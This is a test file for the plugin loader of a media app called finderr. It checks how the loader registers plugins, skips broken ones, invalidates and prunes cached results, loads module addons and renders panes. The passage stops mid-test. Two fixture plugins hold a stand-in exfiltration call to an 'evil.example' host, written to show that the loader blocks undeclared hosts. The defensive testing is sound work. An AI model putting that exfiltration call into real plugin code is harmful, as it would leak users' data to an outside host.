import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { AddonConfigStore, REDACTED, redactingLog } from "./addon-config";
import { loadConfig } from "./config";
import { FacetResolver } from "./facet-resolver";
import type { FacetEntity } from "./facets";
import { renderPanes } from "./panes";
import type { PluginFetch } from "./plugin-fetch";
import { DEFAULT_CONFIG_VERSION, loadPlugins } from "./plugins";
import { Store } from "./store";

/**
 * Fixture plugins live under the repo, not in `/tmp`.
 *
 * Bun 1.4.0's test runner stalls for ~5 seconds on the FIRST dynamic import of a path
 * outside the project root -- long enough to blow the default 5s test timeout, and only
 * ever on the first one, which makes it look like a flaky test rather than a fixed cost.
 * `.claude/temp` is inside the root, gitignored, and outside tsconfig's `include`, so a
 * fixture left behind by a crashed run cannot break `bun run typecheck`.
 */
const FIXTURE_ROOT = new URL("../../.claude/temp/", import.meta.url).pathname;

let dataDir: string;
let pluginsDir: string;
let store: Store;
let logs: string[];

beforeEach(() => {
  dataDir = mkdtempSync(`${tmpdir()}/finderr-test-`);
  // A fresh directory per test, so the module cache never serves a previous fixture.
  mkdirSync(FIXTURE_ROOT, { recursive: true });
  pluginsDir = mkdtempSync(`${FIXTURE_ROOT}plugins-`);
  process.env.FINDERR_DATA_DIR = dataDir;
  store = new Store(loadConfig(true));
  logs = [];
});

afterEach(() => {
  store.close();
  rmSync(dataDir, { recursive: true, force: true });
  rmSync(pluginsDir, { recursive: true, force: true });
  process.env.FINDERR_DATA_DIR = undefined;
});

const INCEPTION: FacetEntity = {
  kind: "movie",
  tconst: "tt1375666",
  title: "Inception",
  originalTitle: "Inception",
  year: 2010,
  runtime: 148,
  ids: { imdb: "tt1375666" },
};

function writePlugin(file: string, source: string): void {
  writeFileSync(`${pluginsDir}/${file}`, source);
}

/** A keyless provider that answers from a constant -- no network, no fixtures to record. */
function ratingsPlugin(id: string, value: number): string {
  return `
export const meta = { id: ${JSON.stringify(id)}, entities: ["movie"] };
export function init(c) {
  return {
    facets: {
      ratings: async () => ({
        data: [{ source: ${JSON.stringify(id)}, kind: "critics", value: ${value}, outOf: 100 }],
        freshness: "settled",
      }),
    },
  };
}
`;
}

function load(fetchImpl?: PluginFetch) {
  return loadPlugins({
    dir: pluginsDir,
    kv: store,
    log: (m) => logs.push(m),
    policy: { minIntervalMsPerHost: 0 },
    fetchImpl,
  });
}

async function resolveWith(registry: Awaited<ReturnType<typeof load>>) {
  const resolver = new FacetResolver({ store, registry, log: (m) => logs.push(m) });
  return resolver.resolve(INCEPTION, { deadlineMs: 2_000 });
}

describe("a plugin file is the whole installation step", () => {
  /** Acceptance 1: dropped in, registered, and its answer is cached under its own id. */
  test("a plugin dropped into the directory provides a facet that lands in the cache", async () => {
    writePlugin("rotten-tomatoes.ts", ratingsPlugin("rotten-tomatoes", 86));

    const facets = await resolveWith(await load());
    expect(facets.ratings).toEqual({
      status: "ready",
      data: [{ source: "rotten-tomatoes", kind: "critics", value: 86, outOf: 100 }],
    });

    const rows = store.facetContributions("tt1375666");
    expect(rows).toHaveLength(1);
    expect(rows[0]?.plugin_id).toBe("rotten-tomatoes");
    expect(rows[0]?.outcome).toBe("ok");
  });

  /** Acceptance 2: the case the facet-list shape exists for. */
  test("two plugins providing ratings merge, namespaced, neither clobbering the other", async () => {
    writePlugin("rotten-tomatoes.ts", ratingsPlugin("rotten-tomatoes", 86));
    writePlugin("servarr-metadata.ts", ratingsPlugin("servarr-metadata", 74));

    const facets = await resolveWith(await load());
    expect(facets.ratings?.status).toBe("ready");
    expect(facets.ratings?.data).toHaveLength(2);
    expect(store.facetContributions("tt1375666")).toHaveLength(2);
  });

  /**
   * Acceptance 3: no core edit, no build, no error. The cached row is deliberately left
   * on disk -- the registry no longer names the plugin, so the row stops counting.
   */
  test("deleting a plugin file removes its contributions and changes nothing else", async () => {
    writePlugin("rotten-tomatoes.ts", ratingsPlugin("rotten-tomatoes", 86));
    writePlugin("servarr-metadata.ts", ratingsPlugin("servarr-metadata", 74));
    expect((await resolveWith(await load())).ratings?.data).toHaveLength(2);

    rmSync(`${pluginsDir}/rotten-tomatoes.ts`);

    const after = await resolveWith(await load());
    expect(after.ratings?.data).toEqual([
      { source: "servarr-metadata", kind: "critics", value: 74, outOf: 100 },
    ]);
    expect(logs.some((l) => /error|failed/i.test(l))).toBe(false);
  });

  test("a directory with no plugins is a working finderr, not an error", async () => {
    const registry = await load();
    expect(registry.list()).toEqual([]);
    const facets = await resolveWith(registry);
    expect(facets.ratings).toEqual({ status: "empty" });
  });

  test("a missing plugins directory is not an error either", async () => {
    const registry = await loadPlugins({ dir: `${pluginsDir}/nope`, kv: store, log: (m) => logs.push(m) });
    expect(registry.list()).toEqual([]);
  });

  test("a test file next to a plugin is not loaded as one", async () => {
    writePlugin("rotten-tomatoes.ts", ratingsPlugin("rotten-tomatoes", 86));
    writePlugin("rotten-tomatoes.test.ts", "throw new Error('a test file must never be loaded');");

    const registry = await load();
    expect(registry.list().map((p) => p.meta.id)).toEqual(["rotten-tomatoes"]);
  });
});

describe("a bad plugin is skipped, never fatal", () => {
  const cases: { name: string; file: string; source: string; expect: RegExp }[] = [
    {
      name: "no meta export",
      file: "no-meta.ts",
      source: "export function init() {}",
      expect: /no meta export/,
    },
    {
      name: "an id that is not kebab-case, because the id namespaces its data",
      file: "bad-id.ts",
      source: `export const meta = { id: "Rotten Tomatoes", entities: ["movie"] };
export function init() { return {}; }`,
      expect: /kebab-case/,
    },
    {
      name: "no init export",
      file: "no-init.ts",
      source: `export const meta = { id: "x", entities: ["movie"] };`,
      expect: /no init/,
    },
    {
      name: "an init that throws",
      file: "throws.ts",
      source: `export const meta = { id: "x", entities: ["movie"] };
export function init() { throw new Error("boom"); }`,
      expect: /boom/,
    },
    {
      name: "an init that returns nothing",
      file: "returns-nothing.ts",
      source: `export const meta = { id: "x", entities: ["movie"] };
export function init() {}`,
      expect: /returned nothing to register/,
    },
    {
      // "Nothing to register" is now BOTH groups being empty, not just `facets`. A plugin
      // that draws a pane and provides no facet is a real plugin -- the old wording, and
      // the old check behind it, would have refused exactly that.
      name: "an init that returns neither a provider nor a pane",
      file: "empty-groups.ts",
      source: `export const meta = { id: "x", entities: ["movie"] };
export function init() { return { facets: {}, panes: [] }; }`,
      expect: /returned nothing to register/,
    },
    {
      name: "a file that will not even import",
      file: "syntax.ts",
      source: "this is not typescript {{{",
      expect: /failed to load/,
    },
  ];

  for (const c of cases) {
    test(`${c.name} is logged and the good plugins still load`, async () => {
      writePlugin(c.file, c.source);
      writePlugin("good.ts", ratingsPlugin("good", 50));

      const registry = await load();
      expect(registry.list().map((p) => p.meta.id)).toEqual(["good"]);
      expect(logs.join("\n")).toMatch(c.expect);
    });
  }

  /**
   * A bad KEY costs its own entry and nothing else.
   *
   * The same rule the resolver applies to a bad ANSWER, one level up: a plugin naming one
   * facet core does not have still provides the ones it named correctly. There is no
   * `meta.provides` to disagree with any more, so this is now the ONLY place a facet name
   * is checked.
   */
  test("a facet core does not declare is dropped, and its siblings survive", async () => {
    writePlugin(
      "typo.ts",
      `export const meta = { id: "typo", entities: ["movie"] };
export function init(c) {
  return { facets: {
    tomatoScore: async () => ({ data: [] }),
    ratings: async () => ({ data: [] }),
  } };
}`,
    );
    const registry = await load();
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);
    expect(logs.join("\n")).toMatch(/'tomatoScore' is not a facet core declares/);
  });

  test("a core-owned facet is dropped, and its siblings survive", async () => {
    writePlugin(
      "greedy.ts",
      `export const meta = { id: "greedy", entities: ["movie"] };
export function init(c) {
  return { facets: {
    availability: async () => ({ data: null }),
    ratings: async () => ({ data: [] }),
  } };
}`,
    );
    const registry = await load();
    expect(registry.providersFor("availability", "movie")).toHaveLength(0);
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);
    expect(logs.join("\n")).toMatch(/core-owned/);
  });

  test("a facet whose value is not a function is dropped", async () => {
    writePlugin(
      "not-a-fn.ts",
      `export const meta = { id: "not-a-fn", entities: ["movie"] };
export function init(c) {
  return { facets: { cast: "oops", ratings: async () => ({ data: [] }) } };
}`,
    );
    const registry = await load();
    expect(registry.providersFor("cast", "movie")).toHaveLength(0);
    expect(logs.join("\n")).toMatch(/facets.cast is not a function/);
  });

  /**
   * Forward compatibility, and the reason the declarative shape was worth having.
   *
   * A plugin written against a finderr that has lifecycle hooks must still LOAD on one
   * that does not, contributing whatever it can. Under the old imperative surface calling
   * `c.hook(...)` was a TypeError that took the whole plugin down; an unknown key is a log
   * line and nothing more.
   */
  test("an unknown export group is logged and ignored, and the known ones still register", async () => {
    writePlugin(
      "from-the-future.ts",
      `export const meta = { id: "from-the-future", entities: ["movie"] };
export function init(c) {
  return {
    facets: { ratings: async () => ({ data: [{ source: "future", kind: "critics", value: 1, outOf: 100 }] }) },
    on: { itemDidBecomeAvailable: async () => {} },
    config: { fields: [] },
  };
}`,
    );
    const registry = await load();
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);
    expect(logs.join("\n")).toMatch(/ignoring unknown export group 'on'/);
    // `panes` USED to be the second example here and is now a real group -- which is the
    // rule working rather than a test going stale. `config` is the next designed-but-unbuilt
    // group (see ADDONS.md), so it inherits the job of being the unknown one.
    expect(logs.join("\n")).toMatch(/ignoring unknown export group 'config'/);

    const facets = await resolveWith(registry);
    expect(facets.ratings?.status).toBe("ready");
  });

  /**
   * Two plugins claiming one id is a collision the registry used to accept silently.
   *
   * `add` overwrote the id in its plugin map while pushing BOTH providers into the facet
   * map, so both ran, both wrote a cache row -- under DIFFERENT config versions, since
   * that is a hash of each one's own source -- and `liveRows` then kept whichever version
   * the surviving registration happened to carry. A coin toss, decided by directory order.
   *
   * Latent while every plugin was a file in this repo, and much less so now that an addon
   * can arrive from node_modules: installing a published fork of a plugin already in the
   * directory is exactly this collision, and the id is what namespaces the data.
   */
  test("a second plugin claiming an id already registered is refused, and the first stands", async () => {
    writePlugin("a-first.ts", ratingsPlugin("twin", 10));
    writePlugin("b-second.ts", ratingsPlugin("twin", 90));

    const registry = await load();
    expect(registry.list()).toHaveLength(1);
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);
    expect(logs.join("\n")).toMatch(/id 'twin' is already registered/);

    // The one that loaded first is the one that answers -- not merely the one counted.
    const facets = await resolveWith(registry);
    expect(facets.ratings?.data).toEqual([{ source: "twin", kind: "critics", value: 10, outOf: 100 }]);
  });

  /**
   * There used to be a guard here refusing a plugin's SECOND provider for one facet.
   *
   * It is gone because the shape now forbids what it policed: one key, one handler, and a
   * duplicate key in an object literal is a TypeScript error before it is anything else.
   * The test that remains asserts the property rather than the guard -- one plugin can
   * only ever hold one slot per facet, however it built the object it returned.
   */
  test("one plugin holds exactly one provider slot per facet", async () => {
    writePlugin(
      "built-by-hand.ts",
      `export const meta = { id: "built-by-hand", entities: ["movie"] };
export function init(c) {
  const facets = {};
  facets.ratings = async () => ({ data: [{ source: "first", kind: "critics", value: 1, outOf: 100 }] });
  facets.ratings = async () => ({ data: [{ source: "second", kind: "critics", value: 2, outOf: 100 }] });
  return { facets };
}`,
    );
    const registry = await load();
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);

    const facets = await resolveWith(registry);
    expect(facets.ratings?.data).toEqual([{ source: "second", kind: "critics", value: 2, outOf: 100 }]);
  });
});

describe("what a plugin is asked, and what it may reach", () => {
  test("a provider is only asked about the entity kinds its meta declares", async () => {
    writePlugin(
      "movies-only.ts",
      `export const meta = { id: "movies-only", entities: ["movie"] };
export function init(c) { return { facets: { ratings: async () => ({ data: [] }) } }; }`,
    );
    const registry = await load();
    expect(registry.providersFor("ratings", "movie")).toHaveLength(1);
    expect(registry.providersFor("ratings", "series")).toHaveLength(0);
  });

  test("a provider is never asked for a facet that does not exist for the kind", async () => {
    writePlugin(
      "seasons.ts",
      `export const meta = { id: "seasons-plugin", entities: ["movie", "series"] };
export function init(c) { return { facets: { seasons: async () => ({ data: [] }) } }; }`,
    );
    const registry = await load();
    // Declared for movies by the plugin, but `seasons` is a series-only facet.
    expect(registry.providersFor("seasons", "movie")).toHaveLength(0);
    expect(registry.providersFor("seasons", "series")).toHaveLength(1);
  });

  /** Acceptance 5: a provider that fetches an undeclared host is refused by core. */
  test("a provider fetching an undeclared host is refused and the facet resolves without it", async () => {
    writePlugin(
      "leaky.ts",
      `export const meta = { id: "leaky", entities: ["movie"], hosts: ["allowed.example"] };
export function init(c) {
  return { facets: {
    ratings: async () => {
      await c.fetch("https://evil.example/exfiltrate");
      return { data: [{ source: "leaky", kind: "critics", value: 1, outOf: 100 }] };
    },
  } };
}`,
    );
    writePlugin("good.ts", ratingsPlugin("good", 50));

    let reached = 0;
    const facets = await resolveWith(
      await load(async () => {
        reached++;
        return new Response("{}");
      }),
    );

    expect(reached).toBe(0);
    expect(logs.join("\n")).toMatch(/not in its declared hosts/);
    // The good plugin's contribution is untouched by its neighbour's failure.
    expect(facets.ratings?.data).toEqual([{ source: "good", kind: "critics", value: 50, outOf: 100 }]);
  });

  test("a plugin's kv is namespaced, so two plugins cannot collide", async () => {
    const source = (id: string) => `
export const meta = { id: ${JSON.stringify(id)}, entities: ["movie"] };
export function init(c) {
  c.kv.set("resolved-id", ${JSON.stringify(id)} + "-value");
  return { facets: {
    ratings: async () => ({
      data: [{ source: c.kv.get("resolved-id"), kind: "critics", value: 1, outOf: 100 }],
    }),
  } };
}`;
    writePlugin("a-plugin.ts", source("a-plugin"));
    writePlugin("b-plugin.ts", source("b-plugin"));

    const facets = await resolveWith(await load());
    expect(facets.ratings?.data?.map((r) => r.source)).toEqual(["a-plugin-value", "b-plugin-value"]);
    expect(store.getKv("plugin:a-plugin:resolved-id")).toBe("a-plugin-value");
  });
});

/**
 * Editing a plugin must invalidate what it already contributed.
 *
 * `facet_contribution`'s primary key has carried `config_version` from the start and the
 * resolver already skipped mismatched rows -- but every plugin was stamped `"0"` forever,
 * so the mechanism never fired once. The lived symptom, found by a second agent on the
 * skyhook ratings: correct a mapping, rebuild the container, and the OLD value keeps
 * being served. For a facet the freshness ladder calls `immutable` that is effectively
 * never.
 */
describe("a changed plugin invalidates its own cached contributions", () => {
  test("editing what a plugin returns changes what is served, without waiting for a TTL", async () => {
    // Loaded from two directories rather than by rewriting one file, because Bun caches
    // a module by resolved path: rewriting in place would re-run the OLD module and the
    // test would be measuring the import cache instead of the invalidation. Two paths is
    // the faithful simulation of what actually happens -- a restart on changed source,
    // same plugin id, same facet, different answer.
    const v1 = mkdtempSync(`${FIXTURE_ROOT}plugins-v1-`);
    const v2 = mkdtempSync(`${FIXTURE_ROOT}plugins-v2-`);
    writeFileSync(`${v1}/scorer.ts`, ratingsPlugin("scorer", 50));
    writeFileSync(`${v2}/scorer.ts`, ratingsPlugin("scorer", 99));

    const before = await resolveWith(await loadPlugins({ dir: v1, kv: store, log: (m) => logs.push(m) }));
    expect(before.ratings?.data?.[0]?.value).toBe(50);

    // `settled` freshness, so the cached row is nowhere near expiry: only the config
    // version can be what makes the new answer visible.
    const after = await resolveWith(await loadPlugins({ dir: v2, kv: store, log: (m) => logs.push(m) }));
    expect(after.ratings?.data?.[0]?.value).toBe(99);

    rmSync(v1, { recursive: true, force: true });
    rmSync(v2, { recursive: true, force: true });
  });

  test("an unchanged plugin keeps its version, so nothing is re-fetched for free", async () => {
    writePlugin("scorer.ts", ratingsPlugin("scorer", 50));
    const first = (await load()).configVersionOf("scorer");
    const second = (await load()).configVersionOf("scorer");
    expect(second).toBe(first);
    expect(first).not.toBe("0");
  });

  /**
   * The case that would have missed the edit this fix was written for. `servarr-metadata`
   * is one entry file plus a `servarr/` directory beside it, and the mapping functions
   * that decide the facet VALUES live in the directory -- so a hash of the entry file
   * alone would call the plugin unchanged after exactly the kind of edit most likely to
   * change what it contributes.
   */
  test("a change inside the plugin's own directory counts as a change", async () => {
    writePlugin(
      "multi.ts",
      `
import { score } from "./multi/scale";
export const meta = { id: "multi", entities: ["movie"] };
export function init(c) {
  return { facets: {
    ratings: async () => ({
      data: [{ source: "multi", kind: "critics", value: score(), outOf: 100 }],
      freshness: "settled",
    }),
  } };
}
`,
    );
    mkdirSync(`${pluginsDir}/multi`, { recursive: true });
    writeFileSync(`${pluginsDir}/multi/scale.ts`, "export const score = () => 10;\n");
    const before = (await load()).configVersionOf("multi");

    // Entry file untouched; only the part it imports changes.
    writeFileSync(`${pluginsDir}/multi/scale.ts`, "export const score = () => 20;\n");
    const after = (await load()).configVersionOf("multi");

    expect(after).not.toBe(before);
  });

  test("the version does not depend on where the plugin lives on disk", async () => {
    // The same plugin runs from /app/src/plugins in the container and from a developer's
    // home directory locally, and both can meet the same persisted database. Hashing the
    // absolute path would invalidate every contribution merely by changing location.
    writePlugin("scorer.ts", ratingsPlugin("scorer", 50));
    const here = (await load()).configVersionOf("scorer");

    const elsewhere = mkdtempSync(`${FIXTURE_ROOT}plugins-moved-`);
    writeFileSync(`${elsewhere}/scorer.ts`, ratingsPlugin("scorer", 50));
    const there = (
      await loadPlugins({ dir: elsewhere, kv: store, log: (m) => logs.push(m) })
    ).configVersionOf("scorer");
    rmSync(elsewhere, { recursive: true, force: true });

    expect(there).toBe(here);
  });
});

/**
 * The second way in: an addon installed with `bun add` and NAMED in config, rather than
 * dropped into the plugins directory.
 *
 * The fixtures here are real packages -- a directory with a `package.json` and an entry
 * file, inside a `node_modules` the loader is pointed at -- because the thing under test
 * is module RESOLUTION. A test that handed over an absolute path would prove the import
 * works and say nothing about whether a bare specifier finds anything.
 */
describe("an addon can also arrive as an installed module", () => {
  let appRoot: string;

  beforeEach(() => {
    appRoot = mkdtempSync(`${FIXTURE_ROOT}app-`);
  });

  afterEach(() => {
    rmSync(appRoot, { recursive: true, force: true });
  });

  /** A published addon: `node_modules/<name>/` with a manifest and an entry file. */
  function installAddon(name: string, source: string, version = "1.0.0"): void {
    const dir = `${appRoot}/node_modules/${name}`;
    mkdirSync(dir, { recursive: true });
    writeFileSync(`${dir}/package.json`, JSON.stringify({ name, version, main: "index.js" }));
    writeFileSync(`${dir}/index.js`, source);
  }

  function loadWithModules(modules: string[]) {
    return loadPlugins({
      dir: pluginsDir,
      modules,
      resolveFrom: appRoot,
      kv: store,
      log: (m) => logs.push(m),
      policy: { minIntervalMsPerHost: 0 },
    });
  }

  test("a module addon provides a facet exactly like a file does", async () => {
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 71));

    const registry = await loadWithModules(["finderr-addon-scores"]);
    expect(registry.list().map((p) => p.meta.id)).toEqual(["addon-scores"]);

    const facets = await resolveWith(registry);
    expect(facets.ratings).toEqual({
      status: "ready",
      data: [{ source: "addon-scores", kind: "critics", value: 71, outOf: 100 }],
    });
  });

  test("a scoped package resolves too", async () => {
    installAddon("@finderr/addon-scoped", ratingsPlugin("addon-scoped", 33));

    const registry = await loadWithModules(["@finderr/addon-scoped"]);
    expect(registry.list().map((p) => p.meta.id)).toEqual(["addon-scoped"]);
  });

  /**
   * The likeliest operational mistake: a name in config that nothing installed. It must
   * cost a log line, not the server -- an addon is an extra, and the front page does not
   * depend on one being present.
   */
  test("a specifier that is not installed is logged, and the other addons still load", async () => {
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 71));
    writePlugin("local.ts", ratingsPlugin("local", 12));

    const registry = await loadWithModules(["finderr-addon-missing", "finderr-addon-scores"]);
    const ids = registry.list().map((p) => p.meta.id);
    expect(ids.sort()).toEqual(["addon-scores", "local"]);
    expect(logs.join("\n")).toMatch(/finderr-addon-missing could not be resolved/);
  });

  test("a bad module addon is skipped like a bad file, never fatal", async () => {
    installAddon("finderr-addon-broken", "export const meta = { id: 'Bad Id' };");
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 71));

    const registry = await loadWithModules(["finderr-addon-broken", "finderr-addon-scores"]);
    expect(registry.list().map((p) => p.meta.id)).toEqual(["addon-scores"]);
    expect(logs.join("\n")).toMatch(/kebab-case/);
  });

  /**
   * A local file and an installed package claiming one id. The directory is walked first,
   * so the local copy stands -- which is what makes "clone the addon, edit it, drop it in
   * the plugins directory" a working override rather than an undefined collision.
   */
  test("a local file beats an installed module claiming the same id", async () => {
    writePlugin("mine.ts", ratingsPlugin("scores", 10));
    installAddon("finderr-addon-scores", ratingsPlugin("scores", 90));

    const registry = await loadWithModules(["finderr-addon-scores"]);
    expect(registry.list()).toHaveLength(1);

    const facets = await resolveWith(registry);
    expect(facets.ratings?.data?.[0]?.value).toBe(10);
    expect(logs.join("\n")).toMatch(/finderr-addon-scores ignored: id 'scores' is already registered/);
  });

  /**
   * A package has no sibling source directory to hash, so its VERSION is what says it
   * changed. Republishing under a new version must invalidate what the old one cached,
   * for the same reason editing a file does.
   */
  test("a new version of the same package invalidates its cached contributions", async () => {
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 50), "1.0.0");
    const before = (await loadWithModules(["finderr-addon-scores"])).configVersionOf("addon-scores");

    // Same entry file, same answer -- only the manifest moves.
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 50), "1.1.0");
    const after = (await loadWithModules(["finderr-addon-scores"])).configVersionOf("addon-scores");

    expect(before).not.toBe(DEFAULT_CONFIG_VERSION);
    expect(after).not.toBe(before);
  });

  test("an unchanged package keeps its version, so nothing is re-fetched for free", async () => {
    installAddon("finderr-addon-scores", ratingsPlugin("addon-scores", 50));
    const first = (await loadWithModules(["finderr-addon-scores"])).configVersionOf("addon-scores");
    const second = (await loadWithModules(["finderr-addon-scores"])).configVersionOf("addon-scores");
    expect(second).toBe(first);
  });

  /**
   * The guard is a property of the loader, not of where the code came from. An installed
   * package is someone else's code, so this is the one that would matter most in anger.
   */
  test("a module addon is held to the same declared-hosts rule", async () => {
    installAddon(
      "finderr-addon-leaky",
      `export const meta = { id: "leaky-addon", entities: ["movie"], hosts: ["allowed.example"] };
export function init(c) {
  return { facets: {
    ratings: async () => {
      await c.fetch("https://evil.example/exfiltrate");
      return { data: [{ source: "leaky-addon", kind: "critics", value: 1, outOf: 100 }] };
    },
  } };
}`,
    );

    let reached = 0;
    const registry = await loadPlugins({
      dir: pluginsDir,
      modules: ["finderr-addon-leaky"],
      resolveFrom: appRoot,
      kv: store,
      log: (m) => logs.push(m),
      policy: { minIntervalMsPerHost: 0 },
      fetchImpl: async () => {
        reached++;
        return new Response("{}");
      },
    });

    const facets = await resolveWith(registry);
    expect(reached).toBe(0);
    expect(logs.join("\n")).toMatch(/not in its declared hosts/);
    expect(facets.ratings?.status).toBe("failed");
  });
});

/**
 * The garbage half of the invalidation, end to end.
 *
 * The version stamp makes a superseded row UNREACHABLE (the test above) and always did.
 * Nothing ever made it GONE, so every plugin edit stranded a full generation of the working
 * set on disk, forever. Measured on the live container 2026-08-31: 10,647 rows across seven
 * generations of two plugins, doubled from 5,433 twelve hours earlier.
 */
describe("superseded contributions are deleted, not merely ignored", () => {
  test("a plugin edit strands rows, and the boot sweep collects exactly those", async () => {
    const v1 = mkdtempSync(`${FIXTURE_ROOT}prune-v1-`);
    const v2 = mkdtempSync(`${FIXTURE_ROOT}prune-v2-`);
    writeFileSync(`${v1}/scorer.ts`, ratingsPlugin("scorer", 50));
    writeFileSync(`${v2}/scorer.ts`, ratingsPlugin("scorer", 99));

    await resolveWith(await loadPlugins({ dir: v1, kv: store, log: (m) => logs.push(m) }));
    expect(store.facetCacheCount()).toBe(1);

    // The edit. Both generations are now on disk: the old one is unreachable through
    // `isLiveContribution` but still occupies a row and still sits under `ix_facet_entity`.
    const v2Registry = await loadPlugins({ dir: v2, kv: store, log: (m) => logs.push(m) });
    await resolveWith(v2Registry);
    expect(store.facetCacheCount()).toBe(2);

    // What the server does at boot, once, after the registry is built.
    expect(store.pruneFacetContributions(v2Registry.currentVersions())).toBe(1);
    expect(store.facetCacheCount()).toBe(1);

    // And the survivor is the LIVE one -- the sweep must not have taken the answer.
    const after = await resolveWith(v2Registry);
    expect(after.ratings?.data?.[0]?.value).toBe(99);

    rmSync(v1, { recursive: true, force: true });
    rmSync(v2, { recursive: true, force: true });
  });

  /**
   * The safety requirement, driven through the real loader rather than asserted on a map.
   * A plugin whose file is broken never registers -- and is indistinguishable from one
   * somebody deleted, because a module that throws on import never announces its id. So the
   * sweep must be driven by what the registry KNOWS, never by what it lacks.
   */
  test("a plugin that fails to load this boot does not lose its cache", async () => {
    const good = mkdtempSync(`${FIXTURE_ROOT}prune-good-`);
    const broken = mkdtempSync(`${FIXTURE_ROOT}prune-broken-`);
    writeFileSync(`${good}/scorer.ts`, ratingsPlugin("scorer", 50));
    writeFileSync(`${broken}/scorer.ts`, "this is not valid typescript at all {{{");

    await resolveWith(await loadPlugins({ dir: good, kv: store, log: (m) => logs.push(m) }));
    expect(store.facetCacheCount()).toBe(1);

    const brokenRegistry = await loadPlugins({ dir: broken, kv: store, log: (m) => logs.push(m) });
    expect(brokenRegistry.list()).toHaveLength(0);

    // Zero, not one. The cache is expensive to fill and the boot where a plugin is broken
    // is the worst possible moment to also throw it away.
    expect(store.pruneFacetContributions(brokenRegistry.currentVersions())).toBe(0);
    expect(store.facetCacheCount()).toBe(1);

    rmSync(good, { recursive: true, force: true });
    rmSync(broken, { recursive: true, force: true });
  });

  test("currentVersions reports every loaded plugin at the version it is running", async () => {
    writePlugin("scorer.ts", ratingsPlugin("scorer", 50));
    const registry = await load();
    const versions = registry.currentVersions();

    expect([...versions.keys()]).toEqual(["scorer"]);
    expect(versions.get("scorer")).toBe(registry.configVersionOf("scorer"));
    expect(versions.get("scorer")).not.toBe(DEFAULT_CONFIG_VERSION);
  });
});

/**
 * The pane registry's acceptance, driven through the real loader.
 *
 * The card's condition: a plugin that provides NO FACET AT ALL, only a pane, renders its
 * block with no core edit -- and deleting the file removes it and changes nothing else.
 */
describe("a plugin can draw a pane instead of providing a facet", () => {
  const panePlugin = (id: string, slot = "title.after-cast", extra = "") => `
export const meta = { id: ${JSON.stringify(id)}, entities: ["movie"] };
export function init(c) {
  return {
    panes: [
      {
        slot: ${JSON.stringify(slot)},
        id: "note",
        needs: [],
        render: () => [{ type: "text", value: "drawn by ${id}" }],
      },
      ${extra}
    ],
  };
}`;

  test("registers with no providers at all, and its pane renders", async () => {
    writePlugin("pane-only.ts", panePlugin("pane-only"));
    const registry = await load();

    // The plugin loaded despite contributing nothing to the facet vocabulary.
    expect(registry.list().map((p) => p.meta.id)).toEqual(["pane-only"]);
    expect(registry.providersFor("ratings", "movie")).toHaveLength(0);
    expect(registry.panes()).toHaveLength(1);

    const rendered = renderPanes(registry.panes(), {} as never, (m) => logs.push(m));
    expect(rendered).toEqual([
      {
        slot: "title.after-cast",
        id: "pane-only:note",
        blocks: [{ type: "text", value: "drawn by pane-only" }],
      },
    ]);
  });

  /**
   * The forward-compatibility promise, applied to slots. A plugin written for a finderr
   * with more slots than this one loses THAT pane and keeps the rest -- the same rule an
   * unknown export group follows one level up.
   */
  test("an unknown slot logs once and no-ops, and the plugin's other panes survive", async () => {
    writePlugin(
      "future-slot.ts",
      panePlugin(
        "future-slot",
        "title.after-cast",
        `{ slot: "title.sidebar-v2", id: "later", needs: [], render: () => [{ type: "text", value: "x" }] },`,
      ),
    );
    const registry = await load();

    expect(registry.panes().map((p) => p.id)).toEqual(["note"]);
    expect(logs.join("\n")).toMatch(/pane 'later' names unknown slot 'title.sidebar-v2' -- dropped/);
  });

  test("a pane declared twice under one id keeps the first and logs the second", async () => {
    writePlugin(
      "dupe.ts",
      panePlugin(
        "dupe",
        "title.after-cast",
        `{ slot: "title.end", id: "note", needs: [], render: () => [{ type: "text", value: "second" }] },`,
      ),
    );
    const registry = await load();

    expect(registry.panes()).toHaveLength(1);
    expect(registry.panes()[0]?.slot).toBe("title.after-cast");
    expect(logs.join("\n")).toMatch(/pane id 'note' is declared twice -- second dropped/);
  });

  test("a pane with no render function is dropped, not fatal", async () => {
    writePlugin(
      "no-render.ts",
      `export const meta = { id: "no-render", entities: ["movie"] };
export function init() {
  return { panes: [{ slot: "title.end", id: "broken", needs: [] }] };
}`,
    );
    writePlugin("good.ts", ratingsPlugin("good", 50));
    const registry = await load();

    // The broken plugin registered NOTHING, so it is skipped entirely -- and the good one
    // still loaded, which is the rule every other bad-plugin case follows.
    expect(registry.list().map((p) => p.meta.id)).toEqual(["good"]);
    expect(logs.join("\n")).toMatch(/pane 'broken' has no render function -- dropped/);
  });

  /**
   * Deleting a plugin file removes its pane with no core edit and no migration -- the same
   * property the facet path has, and the reason the file IS the installation step.
   */
  test("deleting the file removes the pane and nothing else", async () => {
    writePlugin("pane-only.ts", panePlugin("pane-only"));
    writePlugin("good.ts", ratingsPlugin("good", 50));
    expect((await load()).panes()).toHaveLength(1);

    rmSync(`${pluginsDir}/pane-only.ts`);
    const after = await load();
    expect(after.panes()).toEqual([]);
    expect(after.providersFor("ratings", "movie")).toHaveLength(1);
  });
});

/**
 * The declaration half of per-addon configuration, through the real loader.
 *
 * `addon-config.test.ts` owns the resolution rule; what is asserted here is the wiring an
 * addon author actually meets -- a declaration in `meta` becoming a reader on `c.config`, a
 * malformed field costing itself and not the addon, and a changed value moving the plugin's
 * `configVersion` so what the old configuration bought stops being served.
 */
describe("an addon declares what it needs and reads it back through its context", () => {
  /** Reports what it was configured with, so a test can see what `init` actually resolved. */
  function configuredPlugin(id: string): string {
    return `
export const meta = {
  id: ${JSON.stringify(id)},
  entities: ["movie"],
  config: [
    { key: "apiKey", type: "secret", label: "API key", env: "FIXTURE_API_KEY", required: true },
    { key: "source", type: "string", label: "Source", default: "unconfigured" },
  ],
};
export function init(c) {
  const source = c.config.string("source");
  return {
    facets: {
      ratings: async () => ({
        data: [{ source, kind: "critics", value: 50, outOf: 100 }],
